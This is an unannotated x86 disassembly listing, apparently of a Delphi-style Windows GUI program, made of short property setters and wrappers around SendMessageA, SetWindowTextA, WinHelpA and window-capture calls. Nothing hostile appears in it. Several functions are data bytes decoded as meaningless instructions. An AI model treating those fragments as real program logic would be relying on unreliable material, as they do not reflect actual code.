sub_42b984
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42b9bc
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ba6c
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ba88
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42b9c4
sub_42ba9c
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42bab8
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42bad8
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42bb30
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42b9c4
sub_42bb44
push esi
mov esi eax
mov eax esi
call sub_43f4fc
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_40349c
sub_42bc91
jmp sub_4039f4
sub_42bc98
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42bca0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42bca8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42bcb0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42a3e0
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42a4f4
pop esi
pop ebx
retn
sub_42bee0
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4032a0
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42bfa4
jmp sub_4039f4
sub_42bfab
pop ebp
retn
sub_42bfb0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42befc
call sub_403dc4
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402cbc
sub_42bffd
jmp sub_4039f4
sub_42c004
pop ebp
retn
sub_42c008
sub [ rw-data ] 0x1
retn
sub_42c064
jmp sub_4039f4
sub_42c06b
pop ebp
retn
sub_42c070
sub [ rw-data ] 0x1
retn
sub_42c0cc
jmp sub_4039f4
sub_42c0d3
pop ebp
retn
sub_42c0d8
sub [ rw-data ] 0x1
retn
sub_42c139
jmp sub_4039f4
sub_42c140
pop ebp
retn
sub_42c144
sub [ rw-data ] 0x1
retn
sub_42c190
jmp sub_4039f4
sub_42c197
pop ebp
sub_42c198
retn
sub_42c19c
sub [ rw-data ] 0x1
retn
sub_42c1c9
jmp sub_4039f4
sub_42c1d0
pop ebp
retn
sub_42c1d4
sub [ rw-data ] 0x1
retn
sub_42c27c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40be8c
mov [ rw-data ] eax
sub_42c2b1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42c2c8
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42c34b
jmp sub_4039f4
sub_42c352
pop ebp
retn
sub_42c354
sub [ rw-data ] 0x1
retn
sub_42c3c3
jmp [ edi ]
sub_42c664
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42c67c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42c6c0
push ebx
mov ebx eax
mov eax ebx
call sub_42cf1c
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42cf0b
jmp sub_4039f4
sub_42cf1c
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_4270b8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42c690
sub_42cf73
jmp sub_4039f4
sub_42cf7a
pop ebp
retn
sub_42cf7c
sub [ rw-data ] 0x1
retn
sub_42ed98
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_430fe8
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_4312c3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx + 0x1aee8d3 ]
add [ eax ] eax
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43167e
jmp sub_4039f4
sub_431685
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43170a
jmp sub_4039f4
sub_431711
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431718
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_440eb8
pop ebx
retn
sub_43172c
push ebx
mov ebx eax
mov eax ebx
call sub_443c10
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_440eb8
pop ebx
retn
sub_431748
push ebx
mov ebx eax
mov eax ebx
call sub_442be4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4317f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ddf8
pop esi
pop ebx
retn
sub_43195e
jmp sub_4039f4
sub_431965
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431a74
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43fecc
mov eax ebx
mov si 0xffc7
call sub_40349c
pop esi
pop ebx
retn
sub_431b60
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431b7c
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_40349c
sub_431b98
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_431ba4
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41a1b4
sub_431bb8
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431c18
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431c8c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_40349c
pop esi
pop ebx
retn
sub_431ca8
push esi
mov esi eax
mov eax esi
call sub_43f9d8
mov eax esi
mov si 0xffc7
call sub_40349c
pop esi
retn
sub_431d4d
jmp sub_4039f4
sub_431d54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431d5c
push ebx
mov ebx eax
mov eax ebx
call sub_43fb3c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_431d80
push ebx
mov ebx eax
mov eax ebx
call sub_43fb54
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_431e6c
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_432394
sub_431e80
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_432394
mov eax ebx
call sub_441b98
sub_43201c
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4445f8
push eax
call SetWindowTextA
pop ebx
retn
sub_432038
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_432054
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_4320fa
jmp sub_4039f4
sub_432101
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43219a
jmp sub_4039f4
sub_432313
jmp sub_4039f4
sub_432378
push ebx
mov ebx eax
mov eax ebx
call sub_431ed4
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_441994
pop ebx
retn
sub_432478
push ebx
mov ebx eax
mov eax ebx
call sub_43da04
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_432570
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_40349c
sub_432620
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_4326a2
jmp sub_4039f4
sub_4326a9
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432794
jmp sub_4039f4
sub_43279b
pop ebx
pop ecx
pop ebp
retn
sub_43288f
jmp sub_4039f4
sub_432896
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432913
jmp sub_4039f4
sub_43291a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432a70
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_43ddd4
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_432ac0
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_432bf4
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_441b98
sub_432c28
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_432c30
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_432c38
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_432c64
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_43efc4
sub_432dbc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_432ddc
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_441b98
sub_4330a7
jmp sub_403740
sub_4330ac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_433338
jmp sub_4039f4
sub_43333f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433348
push ebx
mov ebx eax
mov eax ebx
call sub_43da04
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_433415
jmp sub_4039f4
sub_43341c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_433428
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_4334a4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_4335be
jmp sub_4039f4
sub_433608
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_433693
jmp sub_4039f4
sub_43369a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4336cc
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_4336d8
mov [ eax + 0x210 ] edx
retn
sub_433729
jmp sub_4039f4
sub_433730
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4337f8
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_441b98
sub_43384c
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_433861
mov eax [ eax + 0x238 ]
retn
sub_433861
push 0x0
xor ecx ecx
mov edx 0x154
call sub_43efc4
retn
sub_433ba0
jmp sub_4039f4
sub_433ba7
pop ebx
mov esp ebp
pop ebp
retn
sub_433f64
jmp sub_4039f4
sub_433f6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434129
jmp sub_4039f4
sub_434130
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43413c
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_434320
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_43432c
mov eax [ r-xdata ]
retn
sub_43455d
jmp sub_4039f4
sub_43456c
retn
sub_434622
jmp sub_4039f4
sub_4346cc
mov eax [ r-xdata ]
retn
sub_4346d4
xor eax eax
retn
sub_4346f8
retn
sub_434810
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_441b98
sub_434888
push ebx
mov ebx eax
mov eax ebx
call sub_455244
test eax eax
je r-xdata
mov eax ebx
call sub_43f34c
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4348ac
xor eax eax
retn
sub_434973
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x33cd173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_43498c
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_40349c
sub_434a7d
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_434a86
jmp sub_4039f4
j_sub_434a7d
jmp sub_434a7d
sub_434a8d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434bc0
mov al [ eax + 0x211 ]
retn
sub_434bf4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_441b98
sub_434dd4
call sub_441b98
retn
sub_434e51
jmp sub_4039f4
sub_434e58
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434e90
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_434f70
jmp sub_4039f4
sub_434f77
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435003
jmp sub_4039f4
sub_43500a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435149
jmp sub_4039f4
sub_435150
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4351e5
jmp sub_4039f4
sub_4351ec
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4351f4
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_40349c
pop esi
retn
sub_435332
jmp sub_4039f4
sub_435354
jmp sub_4039f4
sub_43535b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435364
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_40349c
pop esi
retn
sub_4354ce
jmp sub_4039f4
sub_4354eb
jmp sub_4039f4
sub_4354f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4356a3
jmp sub_4039f4
sub_4356aa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4356f8
push esi
mov si 0xffb1
call sub_40349c
pop esi
retn
sub_435704
push esi
mov si 0xffb0
call sub_40349c
pop esi
retn
sub_435758
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4358c3
jmp sub_4039f4
sub_4358ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435a14
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_435a38
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_435b0c
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_441b98
sub_435b24
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_441b98
sub_435b40
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_441b98
sub_435c54
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_441b98
sub_435cb4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_435d78
jmp sub_4039f4
sub_435d7f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435e1a
jmp sub_4039f4
sub_435e21
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435e28
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_441b98
sub_4364c8
push ebx
mov ebx eax
mov eax ebx
call sub_442be4
mov eax ebx
call sub_435940
pop ebx
retn
sub_436648
jmp sub_4039f4
sub_43664f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_436658
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_436a6c
jmp sub_4039f4
sub_436a73
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436b50
jmp sub_4039f4
sub_436b57
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436b60
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_436f57
jmp sub_4039f4
sub_436f5e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_436f68
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_436e20
retn
sub_436fd4
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_436e20
retn
sub_436fec
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_436e20
retn
sub_437000
push ebx
mov ebx eax
mov eax ebx
call sub_43da04
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_437024
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43715c
call sub_437044
retn
sub_437164
call sub_437044
retn
sub_437194
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_437310
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_437319
jmp sub_4039f4
j_sub_437310
jmp sub_437310
sub_437320
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437328
push ebx
mov ebx eax
mov eax ebx
call sub_443b54
mov eax ebx
call sub_43736c
pop ebx
retn
sub_43733c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43736c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_437358
push ebx
mov ebx eax
mov eax ebx
call sub_43fecc
mov eax ebx
call sub_43736c
pop ebx
retn
sub_437444
jmp sub_4039f4
sub_43744b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437484
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_441b98
sub_437498
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
test dl dl
je r-xdata
call sub_43736c
sub_4374b0
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_441b98
sub_4374c4
mov [ eax + 0x20c ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41a1b4
sub_4374d8
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_441b98
sub_437590
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4375c1
jmp sub_4039f4
sub_4375c8
pop ebp
retn
sub_4375cc
sub [ rw-data ] 0x1
retn
sub_437729
jmp sub_4039f4
sub_437730
pop ebp
retn
sub_437734
sub [ rw-data ] 0x1
retn
sub_43773c
inc esi
dec eax
add al ah
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_437fb4
sub_43774d
add eax 0xffffffe0
jmp sub_437d34
sub_437755
add eax 0xffffffe0
jmp sub_437d9c
sub_43775d
add eax 0xffffffe0
jmp sub_437eb0
sub_437765
add eax 0xffffffe0
jmp sub_437f24
sub_43776d
add eax 0xffffffe0
jmp sub_4379e0
sub_437775
add eax 0xffffffe0
jmp sub_4379f4
sub_43777d
add eax 0xffffffe0
jmp sub_437a6c
sub_437785
add eax 0xffffffe0
jmp sub_437b10
sub_43778d
add eax 0xffffffe0
jmp sub_437b14
sub_437795
add eax 0xffffffe0
jmp sub_437b9c
sub_43779d
add eax 0xffffffe0
jmp sub_437ce4
sub_4377a5
add eax 0xffffffe0
jmp sub_437ce8
sub_4377ad
add eax 0xffffffe0
jmp sub_437d04
sub_4377bf
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4057b4
sub_4377c9
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4057c8
sub_43799d
jmp sub_4039f4
sub_4379a4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4379e0
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_4040c8
pop ebx
retn
sub_437a5b
jmp sub_4039f4
sub_437a62
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437af4
jmp sub_4039f4
sub_437afb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437b10
mov al 0x1
retn
sub_437b8f
jmp sub_4039f4
sub_437b96
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437c94
jmp sub_4039f4
sub_437c9b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437ce4
mov [ eax + 0xc ] edx
retn
sub_437ce8
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_437d0d
inc [ ebx + 0x74001c7b ]
or [ ebp - 0x3b17e3bd ] cl
frndint
inc [ ebx + 0x484b003d ]
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_4056e0
sub_437d8c
jmp sub_4039f4
sub_437d93
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437e92
jmp sub_4039f4
sub_437e99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437f12
jmp sub_4039f4
sub_437f19
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437fa4
jmp sub_4039f4
sub_437fab
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43809f
jmp sub_4039f4
sub_4380a6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_438168
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_4380b4
call EnumWindows
retn
sub_4381fa
jmp sub_4039f4
sub_438201
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43820c
xor eax eax
retn
sub_438305
jmp sub_4039f4
sub_43830c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4383f6
jmp sub_4039f4
sub_4383fd
pop ebp
retn
sub_438452
jmp sub_4039f4
sub_438459
pop ebp
retn
sub_438c3c
and [ ebp + 0x41 ] al
add [ esp + eax * 2 ] dh
inc ecx
add [ eax ] ch

sub_438c46
inc ebx
add [ eax ] bl
0x43
sub_4395dc
jmp r-xdata
sub_4395de
0xe8ffe9ff 0xe7ff
sub_4395e5
jmp esi
sub_43a69d
add eax 0xffffff8c
jmp sub_446c84
sub_43a6a5
add eax 0xffffff8c
jmp sub_446c88
sub_43a6ad
add eax 0xffffff8c
jmp sub_446d74
sub_43a6b5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43a6c2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43a6cf
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43a6dc
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43a6e9
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43a6f6
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43a703
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43a710
add eax 0xffffff8c
jmp sub_4483e4
sub_43a722
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4057b4
sub_43a72c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4057c8
sub_43ab84
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43ae97
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413894
retn
sub_43aeb4
push 0x15
mov ecx rw-data
call sub_413854
retn
sub_43afa0
call GetCapture
call sub_43ac84
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43b204
push ebx
push eax
push sub_43b388
call sub_41b230
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43b21c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43b24c
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41b2e4
pop ebx
retn
sub_43b32a
jmp sub_403740
sub_43b35c
xor eax eax
retn
sub_43b360
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43b378
retn
sub_43b37c
mov eax [ rw-data ]
retn
sub_43b384
retn
sub_43b3b2
jmp sub_403740
sub_43b3b7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b3d4
call sub_4034f8
xor eax eax
mov [ rw-data ] eax
retn
sub_43b3e4
call sub_4034f4
xor eax eax
mov [ rw-data ] eax
retn
sub_43b3f4
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b4a4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
